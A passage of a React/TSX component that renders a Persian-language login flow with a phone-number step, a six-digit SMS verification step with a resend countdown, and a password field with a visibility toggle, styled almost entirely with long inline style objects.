                                    lineHeight: "11px",
                                    pointerEvents: "none",
                                    textAlign: "right",
                                  }}
                                >
                                  ​
                                </span>
                              </legend>
                            </fieldset>
                          </div>
                        </div>
                        <p
                          style={{
                            borderColor: "rgba(0, 0, 0, 0.6)",
                            color: "rgba(0, 0, 0, 0.6)",
                            fontSize: "12px",
                            lineHeight: "20.004px",
                            marginTop: "8px",
                            outlineColor: "rgba(0, 0, 0, 0.6)",
                            textAlign: "right",
                            textDecorationColor: "rgba(0, 0, 0, 0.6)",
                            textEmphasisColor: "rgba(0, 0, 0, 0.6)",
                            display: "flex",
                            alignItems: "center",
                          }}
                        >
                          <Info
                            style={{
                              borderColor: "rgba(0, 0, 0, 0.6)",
                              color: "rgba(0, 0, 0, 0.6)",
                              display: "inline-block",
                              fill: "rgba(0, 0, 0, 0.6)",
                              flexShrink: "0",
                              height: "24px",
                              lineHeight: "26.672px",
                              marginLeft: "8px",
                              outlineColor: "rgba(0, 0, 0, 0.6)",
                              overflowClipMargin: "content-box",
                              overflowX: "hidden",
                              overflowY: "hidden",
                              textAlign: "right",
                              textDecorationColor: "rgba(0, 0, 0, 0.6)",
                              textEmphasisColor: "rgba(0, 0, 0, 0.6)",
                              transitionDuration: "0.2s",
                              transitionProperty: "fill",
                              transitionTimingFunction:
                                "cubic-bezier(0.4, 0, 0.2, 1)",
                              userSelect: "none",
                              verticalAlign: "middle",
                              width: "24px",
                            }}
                          />
                          <span>
                            کد دعوت صرفا در زمان ثبت‌نام قابل استفاده است.
                          </span>
                        </p>
                      </div>
                    </div>
                  )}
                </div>

                {/* Submit Section */}
                <div
                  style={{
                    marginTop: "16px",
                  }}
                >
                  <hr
                    style={{
                      borderBottom: "1px solid rgba(0, 0, 0, 0.2)",
                      borderBottomStyle: "solid",
                      borderBottomWidth: "1px",
                      borderColor: "rgba(0, 0, 0, 0.2)",
                      borderLeftStyle: "solid",
                      borderRightStyle: "solid",
                      borderStyle: "solid",
                      borderTopStyle: "solid",
                      flexShrink: "0",
                      marginBottom: "16px",
                      marginLeft: "-20px",
                      marginRight: "-20px",
                      overflowX: "hidden",
                      overflowY: "hidden",
                    }}
                  />
                  <button
                    tabIndex={0}
                    type="submit"
                    disabled={isSubmitting}
                    style={{
                      alignItems: "center",
                      backgroundColor: "rgb(23, 29, 38)",
                      borderBottomLeftRadius: "8px",
                      borderBottomRightRadius: "8px",
                      borderColor: "rgb(255, 255, 255)",
                      borderRadius: "8px",
                      borderTopLeftRadius: "8px",
                      borderTopRightRadius: "8px",
                      color: "rgb(255, 255, 255)",
                      cursor: isSubmitting ? "not-allowed" : "pointer",
                      display: "inline-flex",
                      fontWeight: "500",
                      justifyContent: "center",
                      outlineColor: "rgb(255, 255, 255)",
                      paddingBottom: "10px",
                      paddingLeft: "16px",
                      paddingRight: "16px",
                      paddingTop: "10px",
                      position: "relative",
                      textAlign: "center",
                      textDecorationColor: "rgb(255, 255, 255)",
                      textEmphasisColor: "rgb(255, 255, 255)",
                      textTransform: "uppercase",
                      transitionBehavior: "normal, normal, normal",
                      transitionDelay: "0s, 0s, 0s",
                      transitionDuration: "0.25s, 0.25s, 0.25s",
                      transitionProperty:
                        "background-color, box-shadow, border-color",
                      transitionTimingFunction:
                        "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
                      userSelect: "none",
                      verticalAlign: "middle",
                      width: "100%",
                      border: "none",
                      fontSize: "14px",
                      opacity: isSubmitting ? "0.5" : "1",
                    }}
                  >
                    {isSubmitting ? (
                      <div
                        style={{
                          display: "flex",
                          alignItems: "center",
                          justifyContent: "center",
                        }}
                      >
                        <Loader2
                          style={{
                            width: "16px",
                            height: "16px",
                            marginLeft: "8px",
                            animation: "spin 1s linear infinite",
                          }}
                        />
                        <span>در حال ارسال کد...</span>
                      </div>
                    ) : (
                      <span>ثبت و ادامه</span>
                    )}
                  </button>
                </div>
              </form>
            </>
          )}

          {/* Step 2: Phone Verification */}
          {currentStep === "verify-phone" && (
            <>
              {/* Alert Message */}
              <div
                role="alert"
                style={{
                  backgroundColor: "rgba(0, 122, 255, 0.05)",
                  borderBottomLeftRadius: "8px",
                  borderBottomRightRadius: "8px",
                  borderColor: "rgb(0, 122, 255)",
                  borderRadius: "8px",
                  borderTopLeftRadius: "8px",
                  borderTopRightRadius: "8px",
                  color: "rgb(0, 122, 255)",
                  display: "flex",
                  fontSize: "12px",
                  lineHeight: "20.004px",
                  outlineColor: "rgb(0, 122, 255)",
                  paddingBottom: "16px",
                  paddingLeft: "16px",
                  paddingRight: "16px",
                  paddingTop: "16px",
                  textDecorationColor: "rgb(0, 122, 255)",
                  textEmphasisColor: "rgb(0, 122, 255)",
                  transitionDuration: "0.3s",
                  transitionProperty: "box-shadow",
                  transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1)",
                  width: "100%",
                  border: "1px solid rgb(0, 122, 255)",
                }}
              >
                <div
                  style={{
                    borderColor: "rgb(0, 122, 255)",
                    color: "rgb(0, 122, 255)",
                    display: "flex",
                    fontSize: "22px",
                    lineHeight: "36.674px",
                    marginLeft: "8px",
                    opacity: "0.9",
                    outlineColor: "rgb(0, 122, 255)",
                    textDecorationColor: "rgb(0, 122, 255)",
                    textEmphasisColor: "rgb(0, 122, 255)",
                  }}
                >
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="24"
                    height="24"
                    fill="none"
                    style={{
                      borderColor: "rgb(0, 122, 255)",
                      color: "rgb(0, 122, 255)",
                      fill: "none",
                      fontSize: "22px",
                      height: "24px",
                      lineHeight: "36.674px",
                      outlineColor: "rgb(0, 122, 255)",
                      overflowClipMargin: "content-box",
                      overflowX: "hidden",
                      overflowY: "hidden",
                      textDecorationColor: "rgb(0, 122, 255)",
                      textEmphasisColor: "rgb(0, 122, 255)",
                      width: "24px",
                    }}
                  >
                    <path
                      fill="currentColor"
                      fillRule="evenodd"
                      d="M12 2.5c-5.238 0-9.5 4.261-9.5 9.5s4.262 9.5 9.5 9.5 9.5-4.262 9.5-9.5-4.262-9.5-9.5-9.5"
                      clipRule="evenodd"
                      opacity="0.2"
                    ></path>
                    <path
                      fill="currentColor"
                      d="M12.747 8.291a.75.75 0 0 0-1.5 0v.063a.75.75 0 0 0 1.5 0zM12.753 11.394a.75.75 0 0 0-1.5 0v4.3a.75.75 0 0 0 1.5 0z"
                    ></path>
                  </svg>
                </div>
                <div
                  style={{
                    borderColor: "rgb(0, 122, 255)",
                    color: "rgb(0, 122, 255)",
                    flexGrow: "1",
                    fontSize: "14px",
                    lineHeight: "24.01px",
                    outlineColor: "rgb(0, 122, 255)",
                    overflowX: "auto",
                    overflowY: "auto",
                    textDecorationColor: "rgb(0, 122, 255)",
                    textEmphasisColor: "rgb(0, 122, 255)",
                  }}
                >
                  <div
                    style={{
                      alignItems: "flex-start",
                      borderColor: "rgb(0, 122, 255)",
                      color: "rgb(0, 122, 255)",
                      display: "flex",
                      fontSize: "14px",
                      justifyContent: "space-between",
                      lineHeight: "24.01px",
                      outlineColor: "rgb(0, 122, 255)",
                      textDecorationColor: "rgb(0, 122, 255)",
                      textEmphasisColor: "rgb(0, 122, 255)",
                    }}
                  >
                    <div
                      style={{
                        borderColor: "rgb(0, 122, 255)",
                        color: "rgb(0, 122, 255)",
                        fontSize: "14px",
                        lineHeight: "24.01px",
                        outlineColor: "rgb(0, 122, 255)",
                        textDecorationColor: "rgb(0, 122, 255)",
                        textEmphasisColor: "rgb(0, 122, 255)",
                      }}
                    >
                      <span>کد تایید به شماره </span>
                      <b
                        dir="ltr"
                        style={{
                          borderColor: "rgb(0, 122, 255)",
                          color: "rgb(0, 122, 255)",
                          direction: "ltr",
                          display: "inline",
                          fontSize: "14px",
                          fontWeight: "700",
                          lineHeight: "24.01px",
                          outlineColor: "rgb(0, 122, 255)",
                          textDecorationColor: "rgb(0, 122, 255)",
                          textEmphasisColor: "rgb(0, 122, 255)",
                        }}
                      >
                        {phoneNumber.slice(0, 4) +
                          "****" +
                          phoneNumber.slice(-3)}
                      </b>
                      <span> پیامک شد.</span>
                    </div>
                  </div>
                  <div
                    style={{
                      alignItems: "center",
                      borderColor: "rgb(0, 122, 255)",
                      color: "rgb(0, 122, 255)",
                      display: "flex",
                      fontSize: "14px",
                      lineHeight: "24.01px",
                      outlineColor: "rgb(0, 122, 255)",
                      textDecorationColor: "rgb(0, 122, 255)",
                      textEmphasisColor: "rgb(0, 122, 255)",
                    }}
                  />
                </div>
              </div>

              {/* 6 Separate OTP Inputs */}
              <div
                style={{
                  direction: "ltr",
                  display: "flex",
                  flexFlow: "row wrap",
                  flexWrap: "wrap",
                  marginRight: "-8px",
                  marginTop: "-8px",
                  width: "calc(100% + 8px)",
                }}
              >
                {[0, 1, 2, 3, 4, 5].map((index) => (
                  <div
                    key={index}
                    style={{
                      direction: "ltr",
                      flexBasis: "0px",
                      flexGrow: "1",
                      maxWidth: "100%",
                      paddingRight: "8px",
                      paddingTop: "8px",
                    }}
                  >
                    <div
                      style={{
                        direction: "ltr",
                        display: "inline-flex",
                        flexDirection: "column",
                        flexFlow: "column nowrap",
                        marginBottom: "8px",
                        marginTop: "16px",
                        position: "relative",
                        verticalAlign: "top",
                        width: "100%",
                      }}
                    >
                      <div
                        style={{
                          alignItems: "center",
                          borderBottomLeftRadius: "8px",
                          borderBottomRightRadius: "8px",
                          borderRadius: "8px",
                          borderTopLeftRadius: "8px",
                          borderTopRightRadius: "8px",
                          cursor: "text",
                          direction: "ltr",
                          display: "flex",
                          position: "relative",
                          textAlign: "center",
                          width: "100%",
                        }}
                      >
                        <input
                          aria-invalid="false"
                          autoComplete={index === 0 ? "one-time-code" : "off"}
                          type="tel"
                          maxLength={1}
                          value={verifyCode[index] || ""}
                          onChange={(e) => {
                            const newValue = e.target.value;
                            if (newValue.match(/^[0-9]*$/)) {
                              const newCode = verifyCode.split("");
                              newCode[index] = newValue;
                              setVerifyCode(newCode.join(""));

                              // Auto focus next input
                              if (newValue && index < 5) {
                                const nextInput = document.querySelector(
                                  `input[data-index="${index + 1}"]`,
                                ) as HTMLInputElement;
                                if (nextInput) nextInput.focus();
                              }
                            }
                          }}
                          onKeyDown={(e) => {
                            if (
                              e.key === "Backspace" &&
                              !verifyCode[index] &&
                              index > 0
                            ) {
                              const prevInput = document.querySelector(
                                `input[data-index="${index - 1}"]`,
                              ) as HTMLInputElement;
                              if (prevInput) prevInput.focus();
                            }
                          }}
                          data-index={index}
                          disabled={isSubmitting}
                          style={{
                            animation:
                              "0.01s ease 0s 1 normal none running mui-auto-fill-cancel",
                            animationDuration: "0.01s",
                            animationName: "mui-auto-fill-cancel",
                            appearance: "auto",
                            boxSizing: "content-box",
                            cursor: "text",
                            direction: "ltr",
                            overflowX: "clip",
                            overflowY: "clip",
                            paddingBottom: "10px",
                            paddingLeft: "12px",
                            paddingRight: "12px",
                            paddingTop: "10px",
                            textAlign: "center",
                            width: "100%",
                            border: "none",
                            outline: "none",
                            fontSize: "16px",
                            fontWeight: "500",
                          }}
                        />
                        <fieldset
                          aria-hidden="true"
                          style={{
                            borderBottom: errors.verifyCode
                              ? "1px solid rgb(220, 38, 38)"
                              : "1px solid rgba(0, 0, 0, 0.2)",
                            borderBottomLeftRadius: "8px",
                            borderBottomRightRadius: "8px",
                            borderBottomStyle: "solid",
                            borderBottomWidth: "1px",
                            borderColor: errors.verifyCode
                              ? "rgb(220, 38, 38)"
                              : "rgba(0, 0, 0, 0.2)",
                            borderLeft: errors.verifyCode
                              ? "1px solid rgb(220, 38, 38)"
                              : "1px solid rgba(0, 0, 0, 0.2)",
                            borderLeftStyle: "solid",
                            borderLeftWidth: "1px",
                            borderRadius: "8px",
                            borderRight: errors.verifyCode
                              ? "1px solid rgb(220, 38, 38)"
                              : "1px solid rgba(0, 0, 0, 0.2)",
                            borderRightStyle: "solid",
                            borderRightWidth: "1px",
                            borderStyle: "solid",
                            borderTop: errors.verifyCode
                              ? "1px solid rgb(220, 38, 38)"
                              : "1px solid rgba(0, 0, 0, 0.2)",
                            borderTopLeftRadius: "8px",
                            borderTopRightRadius: "8px",
                            borderTopStyle: "solid",
                            borderTopWidth: "1px",
                            borderWidth: "1px",
                            bottom: "0px",
                            cursor: "text",
                            direction: "ltr",
                            left: "0px",
                            minWidth: "0%",
                            overflowX: "hidden",
                            overflowY: "hidden",
                            paddingLeft: "8px",
                            paddingRight: "8px",
                            pointerEvents: "none",
                            position: "absolute",
                            right: "0px",
                            textAlign: "right",
                            top: "-5px",
                          }}
                        >
                          <legend
                            style={{
                              cursor: "text",
                              direction: "ltr",
                              lineHeight: "11px",
                              overflowX: "hidden",
                              overflowY: "hidden",
                              pointerEvents: "none",
                              textAlign: "right",
                              transitionDuration: "0.15s",
                              transitionProperty: "width",
                              transitionTimingFunction:
                                "cubic-bezier(0, 0, 0.2, 1)",
                            }}
                          >
                            <span
                              aria-hidden="true"
                              style={{
                                cursor: "text",
                                direction: "ltr",
                                display: "inline",
                                lineHeight: "11px",
                                pointerEvents: "none",
                                textAlign: "right",
                              }}
                            >
                              ​
                            </span>
                          </legend>
                        </fieldset>
                      </div>
                    </div>
                  </div>
                ))}
              </div>

              {errors.verifyCode && (
                <p
                  style={{
                    color: "rgb(220, 38, 38)",
                    fontSize: "12px",
                    textAlign: "right",
                    marginTop: "8px",
                  }}
                >
                  {errors.verifyCode}
                </p>
              )}

              {/* Countdown Timer */}
              <div style={{ marginTop: "8px" }}>
                <p
                  style={{
                    borderColor: "rgba(0, 0, 0, 0.6)",
                    color: "rgba(0, 0, 0, 0.6)",
                    fontSize: "14px",
                    lineHeight: "24.01px",
                    outlineColor: "rgba(0, 0, 0, 0.6)",
                    paddingBottom: "4px",
                    paddingTop: "4px",
                    textDecorationColor: "rgba(0, 0, 0, 0.6)",
                    textEmphasisColor: "rgba(0, 0, 0, 0.6)",
                    textAlign: "right",
                    margin: "0",
                  }}
                >
                  {countdown > 0 ? (
                    <>
                      <span>{toPersianDigits(countdown)}</span>
                      <span> ثانیه تا ارسال مجدد کد</span>
                    </>
                  ) : (
                    <button
                      onClick={() => setCountdown(60)}
                      style={{
                        color: "rgb(0, 122, 255)",
                        textDecoration: "underline",
                        background: "none",
                        border: "none",
                        cursor: "pointer",
                        fontSize: "14px",
                      }}
                    >
                      ارسال مجدد کد پیامک
                    </button>
                  )}
                </p>
              </div>

              {/* Action Buttons */}
              <div style={{ marginTop: "16px" }}>
                <hr
                  style={{
                    borderBottom: "1px solid rgba(0, 0, 0, 0.2)",
                    borderBottomStyle: "solid",
                    borderBottomWidth: "1px",
                    borderColor: "rgba(0, 0, 0, 0.2)",
                    borderLeftStyle: "solid",
                    borderRightStyle: "solid",
                    borderStyle: "solid",
                    borderTopStyle: "solid",
                    flexShrink: "0",
                    marginBottom: "16px",
                    marginLeft: "-20px",
                    marginRight: "-20px",
                    overflowX: "hidden",
                    overflowY: "hidden",
                  }}
                />
                <div
                  style={{
                    display: "flex",
                    gap: "12px",
                  }}
                >
                  {/* Edit Number Button */}
                  <button
                    tabIndex={0}
                    type="button"
                    onClick={() => setCurrentStep("phone")}
                    style={{
                      alignItems: "center",
                      borderBottom: "1px solid rgba(0, 0, 0, 0.2)",
                      borderBottomLeftRadius: "8px",
                      borderBottomRightRadius: "8px",
                      borderBottomStyle: "solid",
                      borderBottomWidth: "1px",
                      borderColor: "rgba(0, 0, 0, 0.2)",
                      borderLeft: "1px solid rgba(0, 0, 0, 0.2)",
                      borderLeftStyle: "solid",
                      borderLeftWidth: "1px",
                      borderRadius: "8px",
                      borderRight: "1px solid rgba(0, 0, 0, 0.2)",
                      borderRightStyle: "solid",
                      borderRightWidth: "1px",
                      borderStyle: "solid",
                      borderTop: "1px solid rgba(0, 0, 0, 0.2)",
                      borderTopLeftRadius: "8px",
                      borderTopRightRadius: "8px",
                      borderTopStyle: "solid",
                      borderTopWidth: "1px",
                      borderWidth: "1px",
                      color: "rgba(0, 0, 0, 0.6)",
                      cursor: "pointer",
                      display: "flex",
                      fontWeight: "500",
                      justifyContent: "center",
                      outlineColor: "rgba(0, 0, 0, 0.6)",
                      paddingBottom: "10px",
                      paddingLeft: "16px",
                      paddingRight: "16px",
                      paddingTop: "10px",
                      position: "relative",
                      textAlign: "center",
                      textDecorationColor: "rgba(0, 0, 0, 0.6)",
                      textEmphasisColor: "rgba(0, 0, 0, 0.6)",
                      textTransform: "uppercase",
                      transitionBehavior: "normal, normal, normal",
                      transitionDelay: "0s, 0s, 0s",
                      transitionDuration: "0.25s, 0.25s, 0.25s",
                      transitionProperty:
                        "background-color, box-shadow, border-color",
                      transitionTimingFunction:
                        "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
                      userSelect: "none",
                      verticalAlign: "middle",
                      width: "100%",
                      backgroundColor: "rgba(0, 0, 0, 0)",
                      fontSize: "14px",
                    }}
                  >
                    ویرایش شماره
                  </button>

                  {/* Submit Button */}
                  <button
                    tabIndex={0}
                    type="button"
                    onClick={handleVerifyCodeSubmit}
                    disabled={isSubmitting || verifyCode.length !== 6}
                    style={{
                      alignItems: "center",
                      backgroundColor: "rgb(23, 29, 38)",
                      borderBottomLeftRadius: "8px",
                      borderBottomRightRadius: "8px",
                      borderColor: "rgb(255, 255, 255)",
                      borderRadius: "8px",
                      borderTopLeftRadius: "8px",
                      borderTopRightRadius: "8px",
                      color: "rgb(255, 255, 255)",
                      cursor:
                        isSubmitting || verifyCode.length !== 6
                          ? "not-allowed"
                          : "pointer",
                      display: "flex",
                      fontWeight: "500",
                      justifyContent: "center",
                      outlineColor: "rgb(255, 255, 255)",
                      paddingBottom: "10px",
                      paddingLeft: "16px",
                      paddingRight: "16px",
                      paddingTop: "10px",
                      position: "relative",
                      textAlign: "center",
                      textDecorationColor: "rgb(255, 255, 255)",
                      textEmphasisColor: "rgb(255, 255, 255)",
                      textTransform: "uppercase",
                      transitionBehavior: "normal, normal, normal",
                      transitionDelay: "0s, 0s, 0s",
                      transitionDuration: "0.25s, 0.25s, 0.25s",
                      transitionProperty:
                        "background-color, box-shadow, border-color",
                      transitionTimingFunction:
                        "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
                      userSelect: "none",
                      verticalAlign: "middle",
                      width: "100%",
                      border: "none",
                      fontSize: "14px",
                      opacity:
                        isSubmitting || verifyCode.length !== 6 ? "0.5" : "1",
                    }}
                  >
                    {isSubmitting ? (
                      <div
                        style={{
                          display: "flex",
                          alignItems: "center",
                          justifyContent: "center",
                        }}
                      >
                        <Loader2
                          style={{
                            width: "16px",
                            height: "16px",
                            marginLeft: "8px",
                            animation: "spin 1s linear infinite",
                          }}
                        />
                        <span>در حال تایید...</span>
                      </div>
                    ) : (
                      <>
                        <span
                          style={{
                            borderColor: "rgb(255, 255, 255)",
                            color: "rgb(255, 255, 255)",
                            cursor: "pointer",
                            display: "contents",
                            fontWeight: "500",
                            outlineColor: "rgb(255, 255, 255)",
                            textAlign: "center",
                            textDecorationColor: "rgb(255, 255, 255)",
                            textEmphasisColor: "rgb(255, 255, 255)",
                            textTransform: "uppercase",
                            userSelect: "none",
                          }}
                        />
                        <span>ثبت و ادامه</span>
                      </>
                    )}
                  </button>
                </div>
              </div>
            </>
          )}

          {/* Step 3: Loading */}
          {currentStep === "loading" && renderLoading()}

          {/* Step 4: Password Authentication */}
          {currentStep === "password" && (
            <>
              <form onSubmit={handlePasswordSubmit}>
                {/* Password Input */}
                <div
                  style={{
                    display: "inline-flex",
                    flexDirection: "column",
                    marginBottom: "16px",
                    position: "relative",
                    verticalAlign: "top",
                    width: "100%",
                  }}
                >
                  <label
                    htmlFor="password-input"
                    style={{
                      cursor: "default",
                      fontSize: "14px",
                      fontWeight: "500",
                      lineHeight: "24.01px",
                      marginBottom: "8px",
                      maxWidth: "calc(133% - 32px)",
                      overflowX: "hidden",
                      overflowY: "hidden",
                      position: "relative",
                      right: "0px",
                      textOverflow: "ellipsis",
                      textWrap: "nowrap",
                      top: "0px",
                      transformOrigin: "100% 0%",
                      transitionBehavior: "normal, normal, normal",
                      transitionDelay: "0s, 0s, 0s",
                      transitionDuration: "0.2s, 0.2s, 0.2s",
                      transitionProperty: "color, transform, max-width",
                      transitionTimingFunction:
                        "cubic-bezier(0, 0, 0.2, 1), cubic-bezier(0, 0, 0.2, 1), cubic-bezier(0, 0, 0.2, 1)",
                      userSelect: "none",
                      whiteSpace: "nowrap",
                      zIndex: "1",
                      textAlign: "right",
                      color: "rgb(0, 0, 0)",
                    }}
                  >
                    رمز عبور حساب را وارد کنی��.
                  </label>
                  <div
                    style={{
                      alignItems: "center",
                      borderBottomLeftRadius: "8px",
                      borderBottomRightRadius: "8px",
                      borderRadius: "8px",
                      borderTopLeftRadius: "8px",
                      borderTopRightRadius: "8px",
                      cursor: "text",
                      display: "flex",
                      paddingLeft: "12px",
                      position: "relative",
                      width: "100%",
                    }}
                  >
                    <input
                      id="password-input"
                      aria-invalid="false"
                      name="password"
                      type={showPassword ? "text" : "password"}
                      value={password}
                      onChange={(e) => {
                        setPassword(e.target.value);
                        if (errors.password) {
                          setErrors((prev) => ({
                            ...prev,
                            password: undefined,
                          }));
                        }
                      }}
                      autoFocus
                      disabled={isSubmitting}
                      style={{
                        animation:
                          "0.01s ease 0s 1 normal none running mui-auto-fill-cancel",
                        animationDuration: "0.01s",
                        animationName: "mui-auto-fill-cancel",
                        appearance: "auto",
                        boxSizing: "content-box",
                        cursor: "text",
                        direction: "ltr",
                        fontFeatureSettings: '"ss00"',
                        overflowX: "clip",
                        overflowY: "clip",
                        paddingBottom: "10px",
                        paddingLeft: "12px",
                        paddingRight: "12px",
                        paddingTop: "10px",
                        textAlign: "right",
                        width: "100%",
                        border: "none",
                        outline: "none",
                        fontSize: "14px",
                      }}
                    />
                    <div
                      style={{
                        alignItems: "center",
                        borderColor: "rgba(0, 0, 0, 0.6)",
                        color: "rgba(0, 0, 0, 0.6)",
                        cursor: "text",
                        display: "flex",
                        maxHeight: "32px",
                        outlineColor: "rgba(0, 0, 0, 0.6)",
                        textDecorationColor: "rgba(0, 0, 0, 0.6)",
                        textEmphasisColor: "rgba(0, 0, 0, 0.6)",
                        textWrap: "nowrap",
                        whiteSpace: "nowrap",
                      }}
                    >
                      <button
                        tabIndex={0}
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        style={{
                          alignItems: "center",
                          borderBottomLeftRadius: "50%",
                          borderBottomRightRadius: "50%",
                          borderColor: "rgba(0, 0, 0, 0.6)",
                          borderRadius: "50%",
                          borderTopLeftRadius: "50%",
                          borderTopRightRadius: "50%",
                          color: "rgba(0, 0, 0, 0.6)",
                          cursor: "pointer",
                          display: "flex",
                          flexShrink: "0",
                          fontSize: "24px",
                          justifyContent: "center",
                          lineHeight: "42px",
                          marginLeft: "-8px",
                          outlineColor: "rgba(0, 0, 0, 0.6)",
                          paddingBottom: "8px",
                          paddingLeft: "8px",
                          paddingRight: "8px",
                          paddingTop: "8px",
                          position: "relative",
                          textAlign: "center",
                          textDecorationColor: "rgba(0, 0, 0, 0.6)",
                          textEmphasisColor: "rgba(0, 0, 0, 0.6)",
                          textWrap: "nowrap",
                          transitionDuration: "0.15s",
                          transitionProperty: "background-color",
                          transitionTimingFunction:
                            "cubic-bezier(0.4, 0, 0.2, 1)",
                          userSelect: "none",
                          verticalAlign: "middle",
                          whiteSpace: "nowrap",
                          backgroundColor: "rgba(0, 0, 0, 0)",
                          border: "none",
                        }}
                      >
                        {showPassword ? (
                          <svg
                            xmlns="http://www.w3.org/2000/svg"
                            width="24"
                            height="24"
                            fill="none"
                            focusable="false"
                            aria-hidden="true"
                            viewBox="0 0 24 24"
                            style={{
                              borderColor: "rgba(0, 0, 0, 0.6)",
                              color: "rgba(0, 0, 0, 0.6)",
                              cursor: "pointer",
                              fill: "rgba(0, 0, 0, 0.6)",
                              flexShrink: "0",
                              fontSize: "24px",
                              height: "24px",
                              lineHeight: "42px",
                              outlineColor: "rgba(0, 0, 0, 0.6)",
                              overflowClipMargin: "content-box",
                              overflowX: "hidden",
                              overflowY: "hidden",
                              textAlign: "center",
                              textDecorationColor: "rgba(0, 0, 0, 0.6)",
                              textEmphasisColor: "rgba(0, 0, 0, 0.6)",
                              textWrap: "nowrap",
                              transitionDuration: "0.2s",
                              transitionProperty: "fill",
                              transitionTimingFunction:
                                "cubic-bezier(0.4, 0, 0.2, 1)",
                              userSelect: "none",
                              whiteSpace: "nowrap",
                              width: "24px",
                            }}
                          >
                            <path
                              fill="currentColor"
                              fillRule="evenodd"
                              d="M22.53 2.53a.75.75 0 0 0-1.06-1.06l-3.49 3.489C16.184 3.685 14.135 2.98 12 2.98c-3.848 0-7.352 2.269-9.743 6.027-.545.854-.792 1.949-.792 2.998s.247 2.144.792 2.998a15.2 15.2 0 0 0 2.583 3.096l-3.37 3.37a.75.75 0 1 0 1.06 1.061l7.468-7.467.002-.003L15.06 10l.003-.002zm-8.046 5.925 2.419-2.418C15.388 5.019 13.713 4.48 12 4.48c-3.212 0-6.288 1.891-8.477 5.333-.355.556-.558 1.351-.558 2.192 0 .84.203 1.636.557 2.191a13.7 13.7 0 0 0 2.38 2.841l2.553-2.553a4.326 4.326 0 0 1 6.03-6.03M9.17 12a2.826 2.826 0 0 1 4.229-2.46L9.54 13.4a2.8 2.8 0 0 1-.37-1.4"
                              clipRule="evenodd"
                            ></path>
                            <path
                              fill="currentColor"
                              d="M19.58 7.346a.75.75 0 0 1 1.054.114c.384.477.761.99 1.11 1.538.544.854.791 1.948.791 2.997s-.247 2.144-.793 2.998c-2.39 3.758-5.894 6.027-9.742 6.027a10 10 0 0 1-3.871-.799.75.75 0 1 1 .582-1.382A8.5 8.5 0 0 0 12 19.52c3.212 0 6.288-1.891 8.477-5.332v-.002c.355-.555.558-1.35.558-2.191s-.203-1.636-.557-2.191l-.001-.002A16 16 0 0 0 19.466 8.4a.75.75 0 0 1 .114-1.054"
                            ></path>
                            <path
                              fill="currentColor"
                              d="M16.248 12.836a.75.75 0 0 0-1.476-.272 2.815 2.815 0 0 1-2.218 2.218.75.75 0 0 0 .272 1.476 4.315 4.315 0 0 0 3.422-3.422"
                            ></path>
                          </svg>
                        ) : (
                          <svg
                            xmlns="http://www.w3.org/2000/svg"
                            width="24"
                            height="24"
                            fill="none"
                            focusable="false"
                            aria-hidden="true"
                            viewBox="0 0 24 24"
                            style={{
                              borderColor: "rgba(0, 0, 0, 0.6)",
                              color: "rgba(0, 0, 0, 0.6)",
                              cursor: "pointer",
                              fill: "rgba(0, 0, 0, 0.6)",
                              flexShrink: "0",
                              fontSize: "24px",
                              height: "24px",
                              lineHeight: "42px",
                              outlineColor: "rgba(0, 0, 0, 0.6)",
                              overflowClipMargin: "content-box",
                              overflowX: "hidden",
                              overflowY: "hidden",
                              textAlign: "center",
                              textDecorationColor: "rgba(0, 0, 0, 0.6)",
                              textEmphasisColor: "rgba(0, 0, 0, 0.6)",
                              textWrap: "nowrap",
                              transitionDuration: "0.2s",
                              transitionProperty: "fill",
                              transitionTimingFunction:
                                "cubic-bezier(0.4, 0, 0.2, 1)",
                              userSelect: "none",
                              whiteSpace: "nowrap",
                              width: "24px",
                            }}
                          >
                            <path
                              fill="currentColor"
                              d="M12 4.5C7.305 4.5 3.17 7.255 1.178 11.5a.75.75 0 0 0 0 1c1.992 4.245 6.127 7 10.822 7s8.83-2.755 10.822-7a.75.75 0 0 0 0-1C20.83 7.255 16.695 4.5 12 4.5M12 17c-3.948 0-7.425-2.278-9.17-5.5C4.575 8.278 8.052 6 12 6s7.425 2.278 9.17 5.5C19.425 14.722 15.948 17 12 17"
                            ></path>
                            <path
                              fill="currentColor"
                              d="M12 8.5a3.5 3.5 0 1 0 0 7 3.5 3.5 0 0 0 0-7M10 12a2 2 0 1 1 4 0 2 2 0 0 1-4 0"
                            ></path>
                          </svg>
                        )}
                      </button>
                    </div>
                    <fieldset
                      aria-hidden="true"
                      style={{
                        borderBottom: errors.password
                          ? "1px solid rgb(220, 38, 38)"
                          : "1px solid rgba(0, 0, 0, 0.2)",
                        borderBottomLeftRadius: "8px",
                        borderBottomRightRadius: "8px",
                        borderBottomStyle: "solid",
                        borderBottomWidth: "1px",
                        borderColor: errors.password
                          ? "rgb(220, 38, 38)"
                          : "rgba(0, 0, 0, 0.2)",
                        borderLeft: errors.password
                          ? "1px solid rgb(220, 38, 38)"
                          : "1px solid rgba(0, 0, 0, 0.2)",
                        borderLeftStyle: "solid",
                        borderLeftWidth: "1px",
                        borderRadius: "8px",
                        borderRight: errors.password
                          ? "1px solid rgb(220, 38, 38)"
                          : "1px solid rgba(0, 0, 0, 0.2)",
                        borderRightStyle: "solid",
                        borderRightWidth: "1px",
                        borderStyle: "solid",
                        borderTop: errors.password
                          ? "1px solid rgb(220, 38, 38)"
                          : "1px solid rgba(0, 0, 0, 0.2)",
                        borderTopLeftRadius: "8px",
                        borderTopRightRadius: "8px",
                        borderTopStyle: "solid",
                        borderTopWidth: "1px",
                        borderWidth: "1px",
                        bottom: "0px",
                        cursor: "text",
                        left: "0px",
                        minWidth: "0%",
                        overflowX: "hidden",
                        overflowY: "hidden",
                        paddingLeft: "8px",
                        paddingRight: "8px",
                        pointerEvents: "none",
                        position: "absolute",
                        right: "0px",
                        textAlign: "right",
                        top: "-5px",
                      }}
                    >
                      <legend
                        style={{
                          cursor: "text",
                          fontSize: "12px",
                          height: "11px",
                          lineHeight: "21px",
                          maxWidth: "0.01px",
                          overflowX: "hidden",
                          overflowY: "hidden",
                          pointerEvents: "none",
                          textAlign: "right",
